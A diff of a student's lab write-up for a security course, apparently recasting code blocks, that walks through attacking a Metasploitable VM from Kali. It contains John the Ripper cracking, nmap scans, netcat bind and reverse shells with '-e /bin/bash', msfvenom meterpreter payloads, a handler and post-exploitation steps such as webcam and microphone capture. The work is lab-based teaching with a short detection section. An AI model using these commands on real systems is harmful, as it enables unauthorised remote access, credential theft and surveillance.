@@ -38,15 +38,15 @@ Host only
 ### Prepping our Exercise: VM ip address
 **Which command would you use to get the IP in Linux?**  
 
-```shell
-$ ifconfig # method 1
-$ ip addr # method 2
+```console
+berkankutuk@kali:~$ ifconfig # method 1
+berkankutuk@kali:~$ ip addr # method 2
 ```
 
 **Which command would you use to get the IP in Windows?**  
 
-```shell
-$ ipconfig 
+```console
+berkankutuk@kali:~$ ipconfig 
 ```
 
 **Inspect the whole network configuration of the Linux metasploitable VM, i.e., interfaces, ip addresses, routes.**  
@@ -54,75 +54,79 @@ Done
 
 ### Testing the Tools Presented in Class
 **Using John the Ripper to brute-force Kali's password database. Make things more interesting by changing your password with the passwd command.**  
-```shell
-$ .\john.exe passwordfile –wordlist=”wordlist.txt # To generally brute force a password file
-$ passwd berkankutuk # Changing password
+
+```console
+berkankutuk@kali:~$ .\john.exe passwordfile –wordlist=”wordlist.txt # To generally brute force a password file
+berkankutuk@kali:~$ passwd berkankutuk # Changing password
 ```
 
 **Check for open sockets with netstat or ss. Start the apache2 web server and check again.
 Use nmap on Kali to find the other virtual machines**  
-```shell
-$ nmap -sT -A 10.0.2.0/24
+
+```console
+berkankutuk@kali:~$ nmap -sT -A 10.0.2.0/24
 ```
 
 **Perform all examples for netcat, i.e.,**  
 **Create a listener and connect to it from another terminal window cf. "Opening Pipes Over the Network".**  
-```shell
-$ nc -lvp 1337 # Listening on a port
+
+```console
+berkankutuk@kali:~$ nc -lvp 1337 # Listening on a port
 ```
 
 and from another terminal 
 
-```shell
-$ ifconfig # Find machine ip=10.0.2.15
-$ nc 10.0.2.15 1337 # Connecting to port
+```console
+berkankutuk@kali:~$ ifconfig # Find machine ip=10.0.2.15
+berkankutuk@kali:~$ nc 10.0.2.15 1337 # Connecting to port
 ```
 
 **Connect to a remote shell cf. "Opening a Shell Over the Network with netcat".**  
 Host machine ip: 10.0.2.15
 
-```shell
-$ nc -lvp 1337 -e /bin/bash # Opening the tunnel
+```console
+berkankutuk@kali:~$ nc -lvp 1337 -e /bin/bash # Opening the tunnel
 ```
 
 and from the remote machine
 
-```shell
-$ nc 10.0.2.15 1337 # Connecting to the port
-$ whoami # Testing access
+```console
+berkankutuk@kali:~$ nc 10.0.2.15 1337 # Connecting to the port
+berkankutuk@kali:~$ whoami # Testing access
 ```
 
 **Perform the "Basic Reverse Shell" example.**  
 Host machine ip: 10.0.2.15
 
-```shell
-$ nc -lvp 1337 # Opening port
+```console
+berkankutuk@kali:~$ nc -lvp 1337 # Opening port
 ```
 
 now to the target machine
 
-```shell
-$ nc 10.0.2.15 1337 -e /bin/bash # Connecting to the port
+```console
+berkankutuk@kali:~$ nc 10.0.2.15 1337 -e /bin/bash # Connecting to the port
 ```
 
 and back to host machine
-```shell
-$ whoami # Testing access
+
+```console
+berkankutuk@kali:~$ whoami # Testing access
 ```
 
 **Transfer a file with netcat.**  
 Host machine ip: 10.0.2.15
 
-```shell
-$ echo 'password is: iamhecker' >> secret.txt # Creating the file
-$ nc -lvp 1337 < secret.txt # Opening port and streaming the file
+```console
+berkankutuk@kali:~$ echo 'password is: iamhecker' >> secret.txt # Creating the file
+berkankutuk@kali:~$ nc -lvp 1337 < secret.txt # Opening port and streaming the file
 ```
 
 on another machine
 
-```shell
-$ nc 10.0.2.15 1337 > received.txt # Connecting to the port
-$ cat received.txt # Checking the content
+```console
+berkankutuk@kali:~$ nc 10.0.2.15 1337 > received.txt # Connecting to the port
+berkankutuk@kali:~$ cat received.txt # Checking the content
 ```
 
 ## Simulating Remote Access
@@ -137,21 +141,19 @@ Steps
 5. And then explore the abilities of metasploit's meterpreter.
 
 **Creating the malicious executable**  
-
-```shell
-$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux -f elf LHOST=10.0.2.15 LPORT=1337 -o payload.elf
+```console
+berkankutuk@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux -f elf LHOST=10.0.2.15 LPORT=1337 -o payload.elf
 ```
 
 For windows
-
-```shell
-$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=10.0.2.15 LPORT=1337 -o payload.exe
+```console
+berkankutuk@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=10.0.2.15 LPORT=1337 -o payload.exe
 ```
 
 **Can you explain the difference in the parameter of the "-f" option? What is it good for?**
-man msfvenom | grep "\-f"
-```shell
-$ man msfvenom | grep "\-f" # Using the manual page to get the answer
+
+```console
+berkankutuk@kali:~$ man msfvenom | grep "\-f" # Using the manual page to get the answer
 ```
 
 Answer: The flag `-f` sets the output format
@@ -159,56 +161,54 @@ Answer: The flag `-f` sets the output format
 ## Setting up a Listener
 **The above malicious code is trying to access a configured host/port combination, awaiting further instructions. Therefore, we have to provide a server the malicious code can connect to.**
 
-```shell
-$ msfconsole 
-msf6 $> use multi/handler
-msf6 $> set payload linux/x86/meterpreter/reverse_tcp
-msf6 $> show options
-msf6 $> set LHOST 10.0.2.15
-msf6 $> set LPORT 1337
-msf6 $> exploit
+```console
+berkankutuk@kali:~$ msfconsole
+msf6:~$ use multi/handler
+msf6:~$ set payload linux/x86/meterpreter/reverse_tcp
+msf6:~$ show options
+msf6:~$ set LHOST 10.0.2.15
+msf6:~$ set LPORT 1337
+msf6:~$ exploit
 ```
 
 now open another terminal
-
-```shell
-$ nc -lvp 1337 < payload.elf
+```console
+berkankutuk@kali:~$ nc -lvp 1337 < payload.elf
 ```
 
 shift over to your target machine and type
 
-```shell
-$ nc 10.0.2.15 1337 > payload.elf # Connecting to the port
-$ chmod a+x ./payload.elf # Making the file executable
-$ ./payload.elf # Running the executable
+```console
+vagrant:~$ nc 10.0.2.15 1337 > payload.elf # Connecting to the port
+vagrant:~$ chmod a+x ./payload.elf # Making the file executable
+vagrant:~$ ./payload.elf # Running the executable
 ```
-
 aaand back to the host again
 
-```shell
-meterpreter$ ls # Testing connection
+```console
+meterpreter:~$ ls # Testing connection
 ```
 Boom pwned!
 
 ## Enjoying Your Connection
 Getting the username
 
-```shell
-meterpreter$ getuid 
+```console
+meterpreter:~$ getuid
 ```
 
-
 Getting system info
-```shell
-meterpreter$ sysinfo 
+```console
+meterpreter:~$ sysinfo
 ```
 
 [Other Metasploit commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).
 
 **Questions**  
 **How you tested the vulnerability in Metasploitable3. Provide information obtained from "sysinfo" to prove that you did get access into the specific machine.**
-```shell
-meterpreter$ sysinfo 
+
+```console
+berkankutuk@kali:~$ sysinfo
 Computer     : 10.0.2.4
 OS           : Ubuntu 14.04 (Linux 3.13.0-24-generic)
 Architecture : x64
@@ -239,8 +239,9 @@ Sending the file via email or from another platform to a target person.
 To showcase how we can obtain a reverse shell, which in this case is working because no work have been done in order to secure the target machine. 
 
 **Which folder are you in when you get the meterpreter prompt? And what is the system-information?**  
-```shell
-meterpreter$ pwd 
+
+```console
+meterpreter:~$ pwd
 /home/vagrant
 ```
 
@@ -250,9 +251,10 @@ To the user: Since the tunnel closes as soon as the application stops running, t
 For the owner of the system: Implement a firewall and add policies.
 
 **Now that you have access to the Metasploitable machine what else can we do? Get the list of users on this server, using a shell prompt by typing "shell" into the Meterpreter shell.**
-```shell
-meterpreter$ shell 
-```  
+
+```console
+meterpreter:~$ shell
+```
 
 Hints:
 - Under Linux check /etc/passwd.
@@ -260,13 +262,14 @@ Hints:
 
 
 **To go back to the meterpreter prompt enter "exit"**
-```shell
-meterpreter$ exit 
-```  
+
+```console
+meterpreter:~$ exit
+```
 
 **Using the meterpreter shell, check the output of the "arp" command. What do you find?**
-```shell
-meterpreter$ arp 
+```console
+meterpreter:~$ arp
 ARP cache
 =========
 
@@ -275,12 +278,12 @@ ARP cache
     10.0.2.1    52:54:00:12:35:00
     10.0.2.3    08:00:27:8f:11:1d
     10.0.2.15   08:00:27:cf:52:df
-```  
+```
 
 **At the meterpreter prompt type in help to see a list of commands. Also look at the this link for other commands. For Windows machines, there is for example the winenum command.**
-```shell
-meterpreter$ help 
-```  
+```console
+meterpreter:~$ help
+```
 
 * webcam_snap: Take a snapshot from the specified webcam_snap
 * mic_start: start capturing an audio streaming
@@ -291,9 +294,10 @@ meterpreter$ help
 
 ---
 **Now lets be on the other side of the fence and investigate suspicious connections to our metasploitable server. Which command can you use to see network status and connections?**
-```shell
-$ netstat -plnt
-```  
+
+```console
+vagrant:~$ netstat -plnt
+```
 
 **Is there an anomaly or suspicious connection to our server? What makes it suspicious?**  
 Some unusual established connections, through some suspicious ports.
